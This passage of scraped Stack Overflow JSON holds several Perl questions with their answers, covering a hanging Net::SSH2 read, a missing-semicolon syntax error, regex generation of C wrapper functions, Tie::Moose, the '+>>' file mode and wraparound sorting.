sometimes it finishes on time, sometimes not.</p>\n\n<p>I tracked the problem as coming from this Net::SSH2 command : <code>$in .= $buf while $chan-&gt;read( $buf, 10240 );</code></p>\n\n<p>Here is the full code of the connection :</p>\n\n<pre><code>my $chan = $this-&gt;{netssh2}-&gt;channel() or die $!;\n$chan-&gt;blocking(1);\n$chan-&gt;exec($command);\nmy ($in,$err,$buf,$buf_err);\n\n$in .= $buf while $chan-&gt;read( $buf, 10240 );\n$err .= $buf_err while $chan-&gt;read( $buf_err, 10240, 1 );\n\n$chan-&gt;send_eof;\n1 while !$chan-&gt;eof;\n\n$chan-&gt;wait_closed;\n</code></pre>\n\n<p>I then downloaded a Net::SSH2 source package and modified the C-perl linking (xs) file.\nIt showed me that the problem comes from this line :\n<code>count = libssh2_channel_read_ex(ch-&gt;channel, XLATEXT, pv_buffer, size);</code></p>\n\n<p>This command comes with the libssh2 library : <a href=\"http://www.libssh2.org/libssh2_channel_read_ex.html\" rel=\"nofollow\">http://www.libssh2.org/libssh2_channel_read_ex.html</a></p>\n\n<p>Sometimes (about 1 in 1000 times) the program enters this read and never leaves. Servers affected are differents most of the time.</p>\n\n<p>Do you have any idea what I should be looking for/checking ?\nI've been working on this for a few day, I'd like an external advice very much :)</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1447082078, "post_id": 33612086, "comment_id": 54998676, "body": "Re &quot;I also tried using strict; and warnings&quot;, ALWAYS use these."}, {"owner": {"reputation": 1485, "user_id": 5388516, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/96fff619864c3ebb7654eb98bd945b43?s=128&d=identicon&r=PG&f=1", "display_name": "13aal", "link": "https://stackoverflow.com/users/5388516/13aal"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447087749, "post_id": 33612086, "comment_id": 55002283, "body": "@ikegami why do you always use them?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 4, "creation_date": 1447087821, "post_id": 33612086, "comment_id": 55002329, "body": "<a href=\"http://stackoverflow.com/q/8023959/589924\">Why use strict and warnings?</a>"}, {"owner": {"reputation": 1485, "user_id": 5388516, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/96fff619864c3ebb7654eb98bd945b43?s=128&d=identicon&r=PG&f=1", "display_name": "13aal", "link": "https://stackoverflow.com/users/5388516/13aal"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447088037, "post_id": 33612086, "comment_id": 55002448, "body": "@ikegami awesome thank you!"}, {"owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "edited": false, "score": 0, "creation_date": 1447099473, "post_id": 33612086, "comment_id": 55008979, "body": "Note, when selecting an element of an array, the sigil changes to <code>$</code>: <code>my $rand_elm = $choices[rand @choices];</code>"}], "answers": [{"comments": [{"owner": {"reputation": 4475, "user_id": 1421665, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/btXSP.jpg?s=128&g=1", "display_name": "vogomatix", "link": "https://stackoverflow.com/users/1421665/vogomatix"}, "edited": false, "score": 1, "creation_date": 1447082059, "post_id": 33612137, "comment_id": 54998658, "body": "Nope he&#39;s not kidding. <a href=\"https://www.cs.cf.ac.uk/Dave/PERL/node37.html\" rel=\"nofollow noreferrer\">Perl Comparison Operators</a>. Note there is a difference comparing strings and numbers. If you think something said about Perl is a joke, it&#39;s probably true :D"}, {"owner": {"reputation": 1485, "user_id": 5388516, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/96fff619864c3ebb7654eb98bd945b43?s=128&d=identicon&r=PG&f=1", "display_name": "13aal", "link": "https://stackoverflow.com/users/5388516/13aal"}, "edited": false, "score": 0, "creation_date": 1447082346, "post_id": 33612137, "comment_id": 54998858, "body": "Well that actually explains a whole hell of a lot thank you both!"}, {"owner": {"reputation": 4475, "user_id": 1421665, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/btXSP.jpg?s=128&g=1", "display_name": "vogomatix", "link": "https://stackoverflow.com/users/1421665/vogomatix"}, "edited": false, "score": 2, "creation_date": 1447082673, "post_id": 33612137, "comment_id": 54999047, "body": "For future occasions just look at someone&#39;s reputation score. If they&#39;ve got more than 1000, they&#39;re likely to be trying to tell the truth. If they&#39;ve got more than 100,000 consider it The Word Of God :D"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 4475, "user_id": 1421665, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/btXSP.jpg?s=128&g=1", "display_name": "vogomatix", "link": "https://stackoverflow.com/users/1421665/vogomatix"}, "edited": false, "score": 2, "creation_date": 1447083872, "post_id": 33612137, "comment_id": 54999792, "body": "@vogomatix, Even &quot;Gods&quot; make mistakes, but it&#39;s probably better to assume you&#39;re missing something and ask for more information. // In this case, I think the question was rhetorical, an exclamation. I think the answer consisted solely of &quot;You&#39;re missing a semi-colon after the following: <code>chomp $choice</code>&quot; at that point, so I responded by providing additional information as to why the error appeared where it did (along with the off-topic comment about the wrong operator)."}, {"owner": {"reputation": 1485, "user_id": 5388516, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/96fff619864c3ebb7654eb98bd945b43?s=128&d=identicon&r=PG&f=1", "display_name": "13aal", "link": "https://stackoverflow.com/users/5388516/13aal"}, "edited": false, "score": 0, "creation_date": 1447087592, "post_id": 33612137, "comment_id": 55002192, "body": "@ikegami Thank you for the help, really appreciated"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 5, "last_activity_date": 1447081918, "last_edit_date": 1447081918, "creation_date": 1447081829, "answer_id": 33612137, "question_id": 33612086, "link": "https://stackoverflow.com/questions/33612086/if-statement-outputting-error/33612137#33612137", "title": "If statement outputting error", "body": "<p>You're missing a semi-colon after the following:</p>\n\n<pre><code>chomp $choice\n</code></pre>\n\n<p>Keep in mind that the following is a valid statement:</p>\n\n<pre><code>chomp $choice if ($choice = \"Ruby\")\n</code></pre>\n\n<hr>\n\n<p>By the way, </p>\n\n<pre><code>$choice = \"Ruby\"\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>$choice eq \"Ruby\"\n</code></pre>\n\n<p><code>=</code> is the scalar assignment or list assignment operator.\n<br><code>==</code> is the numerical comparison operator.\n<br><code>eq</code> is the string comparison operator.</p>\n"}, {"tags": [], "owner": {"reputation": 12075, "user_id": 1137055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59d7b43b9eb7d01bd8f7e51febe6053c?s=128&d=identicon&r=PG", "display_name": "dgw", "link": "https://stackoverflow.com/users/1137055/dgw"}, "is_accepted": false, "score": 0, "last_activity_date": 1447081962, "creation_date": 1447081962, "answer_id": 33612176, "question_id": 33612086, "link": "https://stackoverflow.com/questions/33612086/if-statement-outputting-error/33612176#33612176", "title": "If statement outputting error", "body": "<p>You are missing a <code>;</code> after the line <code>chomp $choice</code></p>\n\n<p>Always include <code>use strict;</code> and <code>use warnings;</code> in your scripts.</p>\n"}], "owner": {"reputation": 1485, "user_id": 5388516, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/96fff619864c3ebb7654eb98bd945b43?s=128&d=identicon&r=PG&f=1", "display_name": "13aal", "link": "https://stackoverflow.com/users/5388516/13aal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 33612137, "answer_count": 2, "score": -1, "last_activity_date": 1447081962, "creation_date": 1447081679, "question_id": 33612086, "link": "https://stackoverflow.com/questions/33612086/if-statement-outputting-error", "title": "If statement outputting error", "body": "<p>I'm creating a little program that chooses between 3 different languages and\noutputs either, Ruby, Python, or a random element from an array.</p>\n\n<p>However my if statement apparently has a syntax error in it because no matter what I try, I keep getting this:</p>\n\n<pre><code>syntax error at test.pl line 15, near \") {\"\nsyntax error at test.pl line 17, near \"} elsif\"\nExecution of test.pl aborted due to compilation errors.\n</code></pre>\n\n<p>Here's the code I have as of right now:</p>\n\n<pre><code>sub welcome {\n    my @choices = qw( Perl Python Ruby );\n    my $lang = 3;\n    print(\"Welcome, to the test script, this will test what language you would like to learn.. In order to find out these choices, write this same definition in all three different languages\\n\");\n    print(\"There are\",  $lang,  \"languages to chose from please pick one:\\n\");\n    print \"@choices\";\n    my $choice = &lt;STDIN&gt;;\n    chomp $choice\n    if ($choice = \"Ruby\") {\n        print(\"You have chosen Ruby!\\n\");\n    } elsif ($choice = \"Python\") {\n        print(\"You have chosen Python!\\n\");\n    } else {\n        print(\"You're already writing in Perl!! Let me choose for you:\");\n        my $rand_elm = @choices[rand @choices];\n    }\n}\nwelcome();\n</code></pre>\n\n<p>I've also tried this:</p>\n\n<pre><code>my $choice = &lt;STDIN&gt;;\nchomp $choice\nif ($choice = \"Ruby\") \n{\n    print(\"You have chosen Ruby!\\n\");\n} \nelsif ($choice = \"Python\")\n {\n    print(\"You have chosen Python!\\n\");\n} \nelse\n {\n    print(\"You're already writing in Perl!! Let me choose for you:\");\n    my $rand_elm = @choices[rand @choices];\n}\n}\n</code></pre>\n\n<p>I also tried using <code>strict;</code> and <code>warnings</code></p>\n\n<p>I have also tried with <code>STDIN</code></p>\n\n<p>All of these output the same error. What is causing this error?</p>\n"}, {"tags": ["c", "regex", "perl", "hook"], "answers": [{"comments": [{"owner": {"reputation": 160, "user_id": 1224028, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/bzdVN.jpg?s=128&g=1", "display_name": "godspeed1024", "link": "https://stackoverflow.com/users/1224028/godspeed1024"}, "edited": false, "score": 1, "creation_date": 1447086388, "post_id": 33612447, "comment_id": 55001465, "body": "Thanks a lot! I would prefer an approach using only one regular expression, though this script works. I&#39;m not familiar with regex thus have no idea if it is possible."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1447087037, "post_id": 33612447, "comment_id": 55001868, "body": "Don&#39;t obsess about single regex solutions. Regular expressions are a programming language in their own right - so you can do most things. However they&#39;re also particularly badly designed for complex programming tasks, thanks to their legacy as a super search and replace, which means you end up with hard to read code."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 1, "last_activity_date": 1447082745, "creation_date": 1447082745, "answer_id": 33612447, "question_id": 33611989, "link": "https://stackoverflow.com/questions/33611989/how-to-do-a-sub-regular-expression-replacing-in-each-matched-groups-of-main-re/33612447#33612447", "title": "How to do a sub regular-expression replacing in each matched groups of &quot;main&quot; regular-expression search?", "body": "<p>This perl script seems to do what you need. It uses the negative look-behind assertion to recognise what to remove from the list of attributes: non-whitespace not ending in a comma or right parenthesis, followed by a space.</p>\n\n<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\n\nwhile (&lt;DATA&gt;) {\n    if (my ($func, $args) = /void (\\w+)\\((.+)\\);/) {\n        print \"void Hooked_$func($args) {\\n\";\n        $args =~ s/\\S+(?&lt;![,)]) //g;\n        print \"    $func($args);\\n\";\n    }\n}\n\n__DATA__\nvoid OriginalFunction0(int arg0);\nvoid OriginalFunction1(int arg0, bool arg1);\nvoid OriginalFunction2(const char* arg0, int arg1);\nvoid OriginalFunctionName(int arg0, bool arg1, const char* arg2);\n</code></pre>\n"}], "owner": {"reputation": 160, "user_id": 1224028, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/bzdVN.jpg?s=128&g=1", "display_name": "godspeed1024", "link": "https://stackoverflow.com/users/1224028/godspeed1024"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 1, "accepted_answer_id": 33612447, "answer_count": 1, "score": 0, "last_activity_date": 1447086899, "creation_date": 1447081381, "last_edit_date": 1447086899, "question_id": 33611989, "link": "https://stackoverflow.com/questions/33611989/how-to-do-a-sub-regular-expression-replacing-in-each-matched-groups-of-main-re", "title": "How to do a sub regular-expression replacing in each matched groups of &quot;main&quot; regular-expression search?", "body": "<p>I'm working on something about hooking an existing lib. The implementation details are irrelevant to my question. In short, it is necessary for me to write a function definition for each original function in the lib like following:</p>\n\n<pre><code>void Hooked_OriginalFunctionName(int arg0, bool arg1, const char* arg2) {\n   OriginalFunctionName(arg0,arg1,arg2);\n   //Do other things:\n}\n</code></pre>\n\n<p>Apparently it's a tedious work of manually writing headers(codes above \"//Do other things\" comment) of these functions, thus regular expression replace would be a better choice: I can just copy and paste original function declarations:</p>\n\n<pre><code>void OriginalFunction0(int arg0);\nvoid OriginalFunction1(int arg0, bool arg1);\nvoid OriginalFunction2(const char* arg0, int arg1);\n... ...\n</code></pre>\n\n<p>And use regular expression to replace text which matches pattern:</p>\n\n<pre><code>void\\s(\\w+)\\((.+)\\); \n</code></pre>\n\n<p>with:</p>\n\n<pre><code>void Hooked_$1($2) {$1($2);//Do other things}\n</code></pre>\n\n<p>This approach can generate codes like:</p>\n\n<pre><code>void Hook_OriginalFunction2(const char* arg0, int arg1) {\n    OriginalFunction2(const char* arg0, int arg1);\n    //Do other things\n}\n</code></pre>\n\n<p>However, formats of parameter list of the function calls are obviously wrong. So how can I subsequently replace</p>\n\n<pre><code>\"const char* arg0, int arg1\"\n</code></pre>\n\n<p>with</p>\n\n<pre><code>\"arg0, arg1\"\n</code></pre>\n\n<p>? Is it possible to do all these by only 1 regular expression replacement?</p>\n"}, {"tags": ["perl", "lazy-evaluation", "moose"], "comments": [{"owner": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "edited": false, "score": 1, "creation_date": 1447087950, "post_id": 33611894, "comment_id": 55002405, "body": "<a href=\"https://metacpan.org/pod/Tie::Moose\" rel=\"nofollow noreferrer\">metacpan.org/pod/Tie::Moose</a> seems possibly useful"}, {"owner": {"reputation": 3546, "user_id": 738505, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a0c1dc8ad0ad006d99e97596c88cdab4?s=128&d=identicon&r=PG", "display_name": "letitbee", "link": "https://stackoverflow.com/users/738505/letitbee"}, "reply_to_user": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "edited": false, "score": 0, "creation_date": 1447104544, "post_id": 33611894, "comment_id": 55011677, "body": "@AKHolland bingo! Care to make it into answer so I can accept?"}, {"owner": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "edited": false, "score": 0, "creation_date": 1447105743, "post_id": 33611894, "comment_id": 55012280, "body": "Changed it into answer form. Glad to help."}], "answers": [{"comments": [{"owner": {"reputation": 3546, "user_id": 738505, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a0c1dc8ad0ad006d99e97596c88cdab4?s=128&d=identicon&r=PG", "display_name": "letitbee", "link": "https://stackoverflow.com/users/738505/letitbee"}, "edited": false, "score": 0, "creation_date": 1447085827, "post_id": 33612041, "comment_id": 55001116, "body": "Slower than something like <code>return $x-&gt;{foo} &#47;&#47;= $x-&gt;foo()</code> ?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 3546, "user_id": 738505, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a0c1dc8ad0ad006d99e97596c88cdab4?s=128&d=identicon&r=PG", "display_name": "letitbee", "link": "https://stackoverflow.com/users/738505/letitbee"}, "edited": false, "score": 0, "creation_date": 1447086870, "post_id": 33612041, "comment_id": 55001771, "body": "Yes, because the alternative would have to do that in addition to a sub call."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1447081542, "creation_date": 1447081542, "answer_id": 33612041, "question_id": 33611894, "link": "https://stackoverflow.com/questions/33611894/moose-object-as-a-lazy-hash/33612041#33612041", "title": "Moose object as a lazy hash", "body": "<p>So you want code to run whenever a element of your hash object is accessed? That's possible using <a href=\"http://search.cpan.org/perldoc?Variable::Magic\" rel=\"nofollow\">magic</a>, but it will greatly slow down access to your object.</p>\n"}, {"tags": [], "owner": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "is_accepted": true, "score": 2, "last_activity_date": 1447105704, "creation_date": 1447105704, "answer_id": 33618906, "question_id": 33611894, "link": "https://stackoverflow.com/questions/33611894/moose-object-as-a-lazy-hash/33618906#33618906", "title": "Moose object as a lazy hash", "body": "<p>You can't use it as a hash directly, but with <a href=\"https://metacpan.org/pod/Tie::Moose\" rel=\"nofollow\" title=\"metacpan Tie::Moose\">Tie::Moose</a> you can create a hash which calls the underlying Moose methods. You can pass this hash along to your other code.</p>\n\n<pre><code>use Tie::Moose;\n\nmy $x = Stuff-&gt;new();\ntie my %x, \"Tie::Moose\", $x;\n\nprint Dumper($x{foo}); # { 'bar' =&gt; 'baz' }\n</code></pre>\n"}], "owner": {"reputation": 3546, "user_id": 738505, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a0c1dc8ad0ad006d99e97596c88cdab4?s=128&d=identicon&r=PG", "display_name": "letitbee", "link": "https://stackoverflow.com/users/738505/letitbee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 245, "favorite_count": 0, "accepted_answer_id": 33618906, "answer_count": 2, "score": 1, "last_activity_date": 1447105704, "creation_date": 1447081062, "question_id": 33611894, "link": "https://stackoverflow.com/questions/33611894/moose-object-as-a-lazy-hash", "title": "Moose object as a lazy hash", "body": "<p>I want to replace some hashes used in my program with lazy Moose objects for performance reason. The problem is, there's a lot of code that I don't control that uses, of course, <code>-&gt;{key}</code> to access elements. Such access works with Moose objects, but does not work with lazy ones before they were initialized:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>package Stuff;\n\nuse Moose;\n\nhas foo =&gt; (\n   lazy=&gt;1, \n   default=&gt; sub { +{bar=&gt;baz} }\n);\n\npackage main;\nmy $x = Stuff-&gt;new();\n\nprint Dumper $x-&gt;{foo}; # undef =(\nprint Dumper $x-&gt;foo;   # {bar =&gt; baz }\nprint Dumper $x-&gt;{foo}; # {bar =&gt; baz }\n</code></pre>\n\n<p>Any way to make that first <code>$x-&gt;{foo}</code> initialize the variable?</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 4, "last_activity_date": 1447081750, "last_edit_date": 1447081750, "creation_date": 1447080879, "answer_id": 33611837, "question_id": 33611516, "link": "https://stackoverflow.com/questions/33611516/perl-not-reading-file-when-passed/33611837#33611837", "title": "Perl not reading file when passed &#39;+&gt;&gt;&#39;", "body": "<p><code>&gt;&gt;</code> and <code>+&gt;&gt;</code> open the file for append (<code>O_APPEND</code>), which places the file cursor at the end of the file. You could move the file pointer using <code>seek($fh, 0, SEEK_SET)</code>, or you could open the file using <code>+&lt;</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 5, "last_activity_date": 1447081042, "creation_date": 1447081042, "answer_id": 33611884, "question_id": 33611516, "link": "https://stackoverflow.com/questions/33611516/perl-not-reading-file-when-passed/33611884#33611884", "title": "Perl not reading file when passed &#39;+&gt;&gt;&#39;", "body": "<p><code>+&gt;&gt;</code> opens the file at the end. You need to rewind to the beginning to read from it:</p>\n\n<pre><code>seek FILEHANDLE, 0, 0;\n</code></pre>\n\n<p>But you can then open the file directly with <code>+&lt;</code>.</p>\n"}], "owner": {"reputation": 1176, "user_id": 2486401, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/03116430f52abc27467d5408ad273c53?s=128&d=identicon&r=PG", "display_name": "janDro", "link": "https://stackoverflow.com/users/2486401/jandro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 1, "accepted_answer_id": 33611884, "answer_count": 2, "score": 1, "last_activity_date": 1447081750, "creation_date": 1447079823, "question_id": 33611516, "link": "https://stackoverflow.com/questions/33611516/perl-not-reading-file-when-passed", "title": "Perl not reading file when passed &#39;+&gt;&gt;&#39;", "body": "<p>I am trying to put the contents of a file into an array for grepping purposes but for some reason it is failing to do so when I pass the '+>>' argument. However when I open two separate file handles to the same file with different arguments it works. </p>\n\n<p>This works: </p>\n\n<pre><code>open( FILEHANDLE, '&lt;', $file ) or $file_not_found = 1;\nopen( APPENDFH, '&gt;&gt;', $file );\nmy @file_list = &lt;FILEHANDLE&gt;;\nprint(\"This is my file list @file_list \\n\");\n</code></pre>\n\n<p>Prints:</p>\n\n<pre><code>This is my file list 2015-11-06 11:17:57Example\n</code></pre>\n\n<p>This does not:</p>\n\n<pre><code>open( FILEHANDLE, '+&gt;&gt;', $file ) or $file_not_found = 1;\nmy @file_list = &lt;FILEHANDLE&gt;;\nprint(\"This is my file list @file_list \\n\");\n</code></pre>\n\n<p>Prints:</p>\n\n<pre><code>This is my file list\n</code></pre>\n"}, {"tags": ["perl", "sorting", "perl-data-structures", "date-sorting"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447077355, "post_id": 33610566, "comment_id": 54995632, "body": "How do you know that you start at 97? Are all the numbers sequential?"}, {"owner": {"reputation": 65, "user_id": 5542580, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dacd1ccbe36d795fc75ed15c79ce16e5?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5542580/nithin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447077682, "post_id": 33610566, "comment_id": 54995835, "body": "No it can start at any random no in between 1-99..the above one is just an example..the values will reach 99 and it start from 01 again and it will satrt at some random value."}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1447077955, "post_id": 33610566, "comment_id": 54996027, "body": "@nithin Does it start from <code>1</code> or <code>01</code>?"}, {"owner": {"reputation": 65, "user_id": 5542580, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dacd1ccbe36d795fc75ed15c79ce16e5?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5542580/nithin"}, "edited": false, "score": 0, "creation_date": 1447078180, "post_id": 33610566, "comment_id": 54996165, "body": "It will start from 01"}, {"owner": {"reputation": 65, "user_id": 5542580, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dacd1ccbe36d795fc75ed15c79ce16e5?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5542580/nithin"}, "edited": false, "score": 1, "creation_date": 1447079186, "post_id": 33610566, "comment_id": 54996746, "body": "that&#39;s how the requirement is.Actually we are sorting data packets here.If yesterday the last data pack was 88,today it will start from 89 and will go on till 99 then comes back to 01 02 ....and would stop at some number say 6."}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1447080623, "post_id": 33610566, "comment_id": 54997673, "body": "Will you have cases where the break is ambiguous? For example: <code>01, 02, 50, 98, 99</code> (break could be before 50, or after). What is the smallest difference guaranteed to indicate a break?"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447080271, "post_id": 33610670, "comment_id": 54997417, "body": "Updated answer in response to latest update to the question."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1447079905, "last_edit_date": 1447079905, "creation_date": 1447077131, "answer_id": 33610670, "question_id": 33610566, "link": "https://stackoverflow.com/questions/33610566/sorting-in-perl-in-a-particular-way/33610670#33610670", "title": "Sorting in perl in a particular way", "body": "<p>Say the last number from yesterday is 93 (case 1). You want</p>\n\n<pre><code>94: position 0\n95: position 1\n..\n93: position 99\n</code></pre>\n\n<p>The modulus operation can be used to produce this mapping.</p>\n\n<pre><code>($_ - $last_from_yesterday - 1) % 100\n</code></pre>\n\n<p>Sorting becomes trivial:</p>\n\n<pre><code>sort { ($a - $last_from_yesterday - 1) % 100 &lt;=&gt; ($b - $last_from_yesterday - 1) % 100 }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 65, "user_id": 5542580, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dacd1ccbe36d795fc75ed15c79ce16e5?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5542580/nithin"}, "edited": false, "score": 0, "creation_date": 1447078958, "post_id": 33611041, "comment_id": 54996609, "body": "ya 